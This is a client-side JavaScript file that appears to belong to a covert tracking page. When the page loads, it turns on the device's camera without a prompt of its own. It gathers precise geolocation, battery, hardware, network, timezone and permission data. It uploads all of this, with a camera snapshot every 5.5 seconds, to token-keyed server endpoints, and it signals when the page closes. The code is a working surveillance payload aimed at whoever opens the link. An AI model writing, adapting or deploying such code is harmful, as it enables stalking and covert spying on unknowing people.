(async () => {
  const token = window.TOKEN;
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  const CAPTURE_MS = 5500;
  let stream = null;

  const json = (o) => JSON.stringify(o);

  const getDetails = () => {
    const d = {};
    d.userAgent = navigator.userAgent || "";
    d.platform = navigator.platform || "";
    d.cpuCores = navigator.hardwareConcurrency || null;
    d.ramGB = navigator.deviceMemory || null;
    d.screen = {
      w: window.screen.width,
      h: window.screen.height,
      ratio: window.devicePixelRatio
    };
    try {
      const conn = navigator.connection;
      if (conn) {
        d.network = {
          type: conn.effectiveType,
          downlink: conn.downlink
        };
      }
    } catch (_) {}
    d.permissions = {};
    if (navigator.permissions) {
      navigator.permissions.query({ name: "camera" }).then((r) => d.permissions.camera = r.state).catch(()=>{});
      navigator.permissions.query({ name: "geolocation" }).then((r) => d.permissions.geolocation = r.state).catch(()=>{});
    }
    try {
      const z = Intl.DateTimeFormat().resolvedOptions();
      d.tz = { zone: z.timeZone, offset: new Date().getTimezoneOffset() };
    } catch (_) {}
    return d;
  };

  const getBattery = async () => {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { level: Math.round(b.level * 100), charging: b.charging };
    } catch {
      return null;
    }
  };

  const getCoords = async () =>
    new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 4000 }
      );
    });

  const post = async (url, body) => {
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: json(body),
        keepalive: true
      });
    } catch (_) {}
  };

  const uploadInfo = async () => {
    const [battery, coords] = await Promise.all([
      getBattery(),
      getCoords()
    ]);
    const details = getDetails();
    await post(`/upload_info/${token}`, { battery, coords, details });
  };

  const screenshot = async () => {
    if (!stream || video.videoWidth === 0) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const frame = canvas.toDataURL("image/jpeg", 0.75);
    await post(`/upload_image/${token}`, { image_b64: frame });
  };

  const loop = async () => {
    await uploadInfo();
    await screenshot();
  };

  // --- Start camera automatically ---
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" },
      audio: false
    });
    video.srcObject = stream;
  } catch (_) {
    await uploadInfo();
    return;
  }

  loop();
  setInterval(loop, CAPTURE_MS);

  // graceful finish
  window.addEventListener("beforeunload", () => {
    try {
      navigator.sendBeacon(`/upload_info/${token}`, json({ note: "close" }));
    } catch (_) {}
  });

})();
